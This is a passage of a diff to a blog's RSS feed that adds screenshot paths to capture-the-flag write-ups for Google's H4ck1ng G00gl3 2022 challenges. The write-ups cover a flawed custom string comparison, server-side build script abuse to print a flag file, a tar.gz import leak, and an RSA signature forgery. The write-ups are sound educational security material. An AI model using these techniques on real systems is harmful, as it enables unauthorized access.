 vulnerability and login as &quot;tin&quot;. Let&apos;s check the code.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch02/hashed-passwords.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;I found two hardcoded users and their hashed passwords in the &quot;users.js&quot;
 file. My first idea was to try and bruteforce somehow the password for
 &quot;tin&quot;, but to no avail. I also searched for the value in some rainbow
@@ -1926,7 +1873,7 @@ comment saying: &quot;we don&apos;t allow admins to reset passwords&quot;. &quot
 an admin, and that comment makes me think it has to be an important
 detail. However, I don&apos;t see how this helps me now, so I wrote it down
 and continued reading the code.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch02/reset-password.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;I found another interesting file, &quot;safe-equals.js&quot;. It&apos;s strange because
 &lt;strong&gt;the developers programmed their own version of constant time string
 comparison&lt;/strong&gt;. Programming your own cryptographic functions is dangerous.
@@ -1935,7 +1882,7 @@ it seems to be correct. I didn&apos;t pay the required attention to the code.
 I read it fast and thought it was comparing each letter of the string
 position by position, regardless of the first position where the letters
 differed.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch02/safe-equal.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;That made me lose a lot of time double-checking other parts of the code.
 I went to ask the community. Effectively, the &lt;strong&gt;&quot;safeEqual&quot; function is
 vulnerable&lt;/strong&gt;. I had to come back and read it again. This time I decided
@@ -2025,57 +1972,7 @@ var resetOptions = {
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Executing the script returns the response with the flag. With that, we
 completed the challenge.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep004 challenge 03</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep004ch03/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep004ch03/</guid><description>Complete H4ck1ng G00gl3 ep004 challenge 03: Explore hidden tabs, read server-side scripts, and use creative commits to reveal the flag.</description><pubDate>Mon, 21 Nov 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h1&gt;Introduction&lt;/h1&gt;
-&lt;p&gt;&lt;a href=&quot;https://h4ck1ng.google/&quot;&gt;H4ck1ng G00gl3&lt;/a&gt; is a series of security
-challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only way to win is to
-think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep004
-challenge 03&lt;/strong&gt;. Category &lt;strong&gt;Misc&lt;/strong&gt;.&lt;/p&gt;
-&lt;h1&gt;Learning Journey&lt;/h1&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;In that challenge, we only have the hint. So, I went ahead to the
-webpage used in this episode. Next to the &quot;FAQs&quot; tab, I found the
-&quot;Contributing&quot; tab.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;However, the tab isn&apos;t clickable. Moreover, you have to be authenticated
-to access the URL
-&lt;a href=&quot;https://vrp-website-web.h4ck.ctfcompetition.com/contributing&quot;&gt;https://vrp-website-web.h4ck.ctfcompetition.com/contributing&lt;/a&gt;. That was
-a minor inconvenience, but I remember that the &lt;strong&gt;code in challenge two
-had some layouts of the different web pages&lt;/strong&gt;. I returned to it and
-found the &lt;strong&gt;&quot;contributing.hbs&quot;&lt;/strong&gt; inside the views folder.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;This file explains how to get started contributing.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;In theory, we only need to clone the repository, modify something,
-create a branch and push it. Cloning the repository works as expected,
-but pushing an empty branch will return an error.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;Among the output, we can read: &quot;remote: Skipping presubmit (enable via
-push option)&quot;. I decided to &lt;strong&gt;enable the presubmit option&lt;/strong&gt; and see what
-happens.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;Now, the go command is not found. I installed it on my local machine,
-but nothing changed. It seems that the &lt;strong&gt;&quot;build.sh&quot; is executed on the
-server side, not the client side.&lt;/strong&gt; So, I decided to read the script.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;As we can see in the previous images, what it does is rather simple. The
-scripts initialize a couple of variables and print some information on
-the screen. However, notice the comment in the &quot;configure_flags.sh&quot;.
-&lt;strong&gt;We have to bump the version before pushing a new change. Hence, I
-created a new commit with a new version.&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;The output printed the new version &quot;0.1.2&quot;. What would happen if I try
-to read the &quot;flag&quot; file? With that idea, I modified the script.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;After creating another commit with this new change and executing the
-push, we can read the flag in the output. With that, we completed the
-challenge.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch02/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep005 challenge 01</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep005ch01/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep005ch01/</guid><description>Decode H4ck1ng G00gl3 ep005 challenge 01: manipulate binary data, discover hidden drawings, and stitch images together to reveal the final URL.</description><pubDate>Mon, 28 Nov 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
@@ -2086,7 +1983,7 @@ challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only
 think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep005
 challenge 01&lt;/strong&gt;. Category &lt;strong&gt;Misc&lt;/strong&gt;.&lt;/p&gt;
 &lt;h1&gt;Learning Journey&lt;/h1&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;This challenge gives us a zip containing a binary file. After reading
 the hint, I tried to convert the file into different image formats, but
 it didn&apos;t work. I also checked if the file contained headers from any
@@ -2104,11 +2001,11 @@ cat binary | sed &quot;s/1/\\\e[0;31m1\\\e[0m/g&quot; &amp;gt; binary_color
 # Print text with colors
 echo -e $(cat binary_color)
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch01/colored-binary-output.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;They don&apos;t seem to follow a pattern, but an image has a height and
 width. We have to find it somehow. After some iterations modifying the
 width, I found a drawing with a width equal to 96.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch01/colored-binary-drawing.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;The problem now is that it contains several images, from top to bottom.
 We can form a URL if we arrange them properly. I put them next to each
 other with a height equal to 25. I also took a moment to write a python
@@ -2134,13 +2031,116 @@ for i in range(0, height):
             colored_chunk += &quot; &quot;
     print(colored_chunk)
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch01/wide-drawing.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Still, the URL was not readable. Therefore, I manually made screenshots
 of different parts of the binary and put them together like in a
 collage.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch01/images-together.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;With that, we completed the challenge.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep004 challenge 03</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep004ch03/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep004ch03/</guid><description>Complete H4ck1ng G00gl3 ep004 challenge 03: Explore hidden tabs, read server-side scripts, and use creative commits to reveal the flag.</description><pubDate>Mon, 21 Nov 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&quot;https://h4ck1ng.google/&quot;&gt;H4ck1ng G00gl3&lt;/a&gt; is a series of security
+challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only way to win is to
+think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep004
+challenge 03&lt;/strong&gt;. Category &lt;strong&gt;Misc&lt;/strong&gt;.&lt;/p&gt;
+&lt;h1&gt;Learning Journey&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch03/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;In that challenge, we only have the hint. So, I went ahead to the
+webpage used in this episode. Next to the &quot;FAQs&quot; tab, I found the
+&quot;Contributing&quot; tab.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch03/contributing-tab.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;However, the tab isn&apos;t clickable. Moreover, you have to be authenticated
+to access the URL
+&lt;a href=&quot;https://vrp-website-web.h4ck.ctfcompetition.com/contributing&quot;&gt;https://vrp-website-web.h4ck.ctfcompetition.com/contributing&lt;/a&gt;. That was
+a minor inconvenience, but I remember that the &lt;strong&gt;code in challenge two
+had some layouts of the different web pages&lt;/strong&gt;. I returned to it and
+found the &lt;strong&gt;&quot;contributing.hbs&quot;&lt;/strong&gt; inside the views folder.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch03/view-folder.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;This file explains how to get started contributing.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch03/contributing-hbs.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;In theory, we only need to clone the repository, modify something,
+create a branch and push it. Cloning the repository works as expected,
+but pushing an empty branch will return an error.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch03/prereceive-hook-declined.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Among the output, we can read: &quot;remote: Skipping presubmit (enable via
+push option)&quot;. I decided to &lt;strong&gt;enable the presubmit option&lt;/strong&gt; and see what
+happens.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch03/presubmit-enabled.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Now, the go command is not found. I installed it on my local machine,
+but nothing changed. It seems that the &lt;strong&gt;&quot;build.sh&quot; is executed on the
+server side, not the client side.&lt;/strong&gt; So, I decided to read the script.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch03/build-sh.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch03/configure-flags.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;As we can see in the previous images, what it does is rather simple. The
+scripts initialize a couple of variables and print some information on
+the screen. However, notice the comment in the &quot;configure_flags.sh&quot;.
+&lt;strong&gt;We have to bump the version before pushing a new change. Hence, I
+created a new commit with a new version.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch03/version-changes.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;The output printed the new version &quot;0.1.2&quot;. What would happen if I try
+to read the &quot;flag&quot; file? With that idea, I modified the script.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch03/version-prints-flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;After creating another commit with this new change and executing the
+push, we can read the flag in the output. With that, we completed the
+challenge.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch03/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep004 challenge 01</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep004ch01/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep004ch01/</guid><description>Crack H4ck1ng G00gl3 ep004 challenge 01: explore endpoints, use .tar.gz files and dry run features, and trick the system into revealing the flag.</description><pubDate>Sun, 20 Nov 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&quot;https://h4ck1ng.google/&quot;&gt;H4ck1ng G00gl3&lt;/a&gt; is a series of security
+challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only way to win is to
+think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep004
+challenge 01&lt;/strong&gt;. Category &lt;strong&gt;Web Exploitation&lt;/strong&gt;.&lt;/p&gt;
+&lt;h1&gt;Learning Journey&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;When we open the challenge, it redirects us to a &lt;a href=&quot;https://vrp-website-web.h4ck.ctfcompetition.com/&quot;&gt;copy of Google Bug
+Hunter webpage&lt;/a&gt; of the
+&lt;a href=&quot;https://bughunters.google.com/&quot;&gt;original Google Bug Hunter webpage&lt;/a&gt;.
+The hint suggests searching for some new endpoints. After researching, I
+found the &lt;strong&gt;difference in the FAQs section&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch01/faqs.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We can start playing with the endpoints. First, I start sending a POST
+request to the import endpoint.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch01/import-missing-submission.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;It is missing the submission parameter. Let&apos;s add it.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch01/import-dry-run-enabled.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Interesting. The import endpoint is disabled, but the &lt;strong&gt;dry run is
+enabled&lt;/strong&gt;. I tried enabling it but couldn&apos;t find the correct query
+parameter. So, I decided to give the export endpoint a try.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch01/export-submission-does-not-exist.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch01/export-attachment-does-not-exist.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;The export endpoint shows us that a submission called
+&quot;submission_sample&quot; already exists and that each submission has
+different attachments. But I couldn&apos;t figure out how to proceed with the
+challenge.&lt;/p&gt;
+&lt;p&gt;I asked the community for help, and they told me to &lt;strong&gt;solve the other
+challenges first&lt;/strong&gt;. Therefore, I decided to solve challenges two and
+three. &lt;strong&gt;Challenge two gives us some code. With this code, we can access
+some more code required to solve challenge number three&lt;/strong&gt;. It turns out
+this code contains the import and export functions. We can now see how
+to access the dry run feature.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch01/import-code-dry-run.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;That isn&apos;t enough to solve the challenge. I kept reading the import
+code.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch01/import-attachment-already-exists.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;I found a couple of interesting details. First, the &lt;strong&gt;endpoint expects a
+.tar.gz file&lt;/strong&gt;. Second, &lt;strong&gt;the endpoint will output the difference if the
+file already exists&lt;/strong&gt;. We want to get the flag, so we can probably
+&lt;strong&gt;trick the endpoint into printing the content by uploading a .tar.gz
+containing a &quot;flag&quot; file&lt;/strong&gt;. We know the flag must be in the root path.
+Therefore, we will use &quot;/&quot; as the value for the submission field.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch01/import-tar-with-flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Okay, we have to turn on the debug to see the differences.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch01/import-tar-with-flag-debug.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Making this call will return us the flag! With that, we completed the
+challenge.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep005 challenge 02</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep005ch02/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep005ch02/</guid><description>Crack H4ck1ng G00gl3 ep005 challenge 02: exploit cryptographic vulnerabilities, manipulate scores and signatures to trigger an integer overflow, and reveal the flag.</description><pubDate>Fri, 02 Dec 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
@@ -2151,15 +2151,15 @@ challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only
 think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep005
 challenge 02&lt;/strong&gt;. Category &lt;strong&gt;Cryptography&lt;/strong&gt;.&lt;/p&gt;
 &lt;h1&gt;Learning Journey&lt;/h1&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch02/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;This challenge includes a website and its source code. My first thought
 is that we will have to find and exploit a vulnerability in the code.
 But first, let&apos;s see the website.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch02/website-game.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;The website is a game similar to Google&apos;s Dinosaur Game. We can jump to
 dodge the enemies or use the nest to capture them. Once we die, we need
 to introduce a name. Then we will see the ranking.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch02/website-game-ranking.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Time to read the code. Fast enough, I see a comment telling us the goal.
 We have to get a negative score in the game to get the flag.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;@app.route(&quot;/api/highscores&quot;, methods=[&quot;post&quot;])
@@ -2336,7 +2336,7 @@ and checked the last endpoint.&lt;/p&gt;
 interesting, but we are doing a security challenge that requires forging
 a key. Therefore, I downloaded the key and extracted the modulus and the
 exponent.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch02/public-key-information.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Interesting. The public exponent is 3. I remember, from when I was in
 college doing cryptography, that using an exponent of 3 isn&apos;t insecure
 but can lead to security issues. For example, we could use the &lt;a href=&quot;https://rdist.root.org/2009/10/06/why-rsa-encryption-padding-is-critical/&quot;&gt;Chinese
@@ -2520,7 +2520,7 @@ print(f&quot;Server response: {r.text}&quot;)
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Executing the script prints the flag in the terminal. With that, we
 completed the challenge.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch02/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep005 challenge 03</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep005ch03/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep005ch03/</guid><description>Decode H4ck1ng G00gl3 ep005 challenge 03: uncover hidden Morse code in the episodes, translate it to find the secret message, and complete the series.</description><pubDate>Fri, 02 Dec 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
@@ -2531,7 +2531,7 @@ challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only
 think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep005
 challenge 03&lt;/strong&gt;. Category &lt;strong&gt;Misc&lt;/strong&gt;.&lt;/p&gt;
 &lt;h1&gt;Learning Journey&lt;/h1&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch03/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;For this challenge, we don&apos;t have any data. We have to find the secret
 message hidden in the episodes. I opened all the episodes in different
 browser tabs and looked at each introduction. I searched for colours,
@@ -2544,47 +2544,16 @@ introduction, around the time when a person enters and sits on the
 chair, some high-frequency sounds start to play. It never occurred to me
 that it could be morse. In any case, I decreased the video speed to 0.25
 and started taking notes.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch03/morse.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;I transformed morse into English and copied the link on the browser. It
 didn&apos;t work. I was stuck for a while here checking the episodes and my
 notes. The problem was that they made a mistake and put the same message
 in two episodes. I found out by asking the community. After fixing that,
 I managed to get the last flag.&lt;/p&gt;
 &lt;p&gt;With that, we completed the challenge and the entire series.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>How to patch a git dependency in rust with same location but different branch</title><link>https://danielorihuela.dev/blog/how-to-patch-a-git-dependency-in-rust-with-same-location-but-different-branch/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/how-to-patch-a-git-dependency-in-rust-with-same-location-but-different-branch/</guid><description>Learn to patch Rust git dependencies using different branches with the same repository.</description><pubDate>Mon, 29 May 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;At my current employer, we are developing multiple internal libraries in
-Rust. They are hosted in a git based code hosting.
-&lt;a href=&quot;https://doc.rust-lang.org/cargo/reference/specifying-dependencies.html#specifying-dependencies-from-git-repositories&quot;&gt;Here&lt;/a&gt;
-is how we can specify them from a different repository.&lt;/p&gt;
-&lt;p&gt;Sometimes we want to modify a repository (we will call it &quot;Start&quot;) that
-happens to be one of the lowest dependencies in the tree. And we want to
-test that a specific repository (we will call it &quot;End&quot;) that uses the
-&quot;Start&quot; dependency indirectly still works. For instance, we could have
-the following chain of dependencies: &quot;End&quot; -&amp;gt; &quot;A&quot; -&amp;gt; &quot;B&quot; -&amp;gt; &quot;C&quot; -&amp;gt;
-&quot;Start&quot;, where &quot;-&amp;gt;&quot; represents a dependency.&lt;/p&gt;
-&lt;p&gt;Rust allows to &lt;a href=&quot;https://github.com/rust-lang/cargo/issues/5478&quot;&gt;override
-dependencies&lt;/a&gt;, but it
-does not work in all situations. For instance, it &lt;a href=&quot;https://github.com/rust-lang/cargo/issues/5478&quot;&gt;does not allow
-patching a git repository using a different branch of the same
-repository&lt;/a&gt;. The
-&lt;a href=&quot;https://github.com/rust-lang/cargo/issues/5478#issuecomment-1506056467&quot;&gt;fix&lt;/a&gt;
-is simple but easy to misconfigure. I have problems configuring it every
-time I need to do it.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;[patch.&apos;https://github.com/company/Start&apos;]
-start = { git = &quot;https://www.github.com/company//Start.git&quot;, branch = &quot;new-feature&quot; }
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;There are two important details there.&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;The patch url does not include the trailing &quot;.git&quot;&lt;/li&gt;
-&lt;li&gt;The url in the second line contains &quot;//&quot; before &quot;Start.git&quot;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;Without these two things, you will end with the following error:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Caused by:
-  patch for `start` in `https://github.com/company/Start` points to the same source, but patches must point
-  to different sources
-&lt;/code&gt;&lt;/pre&gt;
-</content:encoded><image>https://danielorihuela.dev/_astro/patch-dependency.BXipaHaQ.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Heap-based buffer overflows</title><link>https://danielorihuela.dev/blog/heap-based-buffer-overflows/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/heap-based-buffer-overflows/</guid><description>Learn how heap-based buffer overflows work and discover preventive measures to safeguard your code against them.</description><pubDate>Sun, 19 Nov 2023 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch03/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch03/final.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Heap-based buffer overflows</title><link>https://danielorihuela.dev/blog/heap-based-buffer-overflows/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/heap-based-buffer-overflows/</guid><description>Learn how heap-based buffer overflows work and discover preventive measures to safeguard your code against them.</description><pubDate>Sun, 19 Nov 2023 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
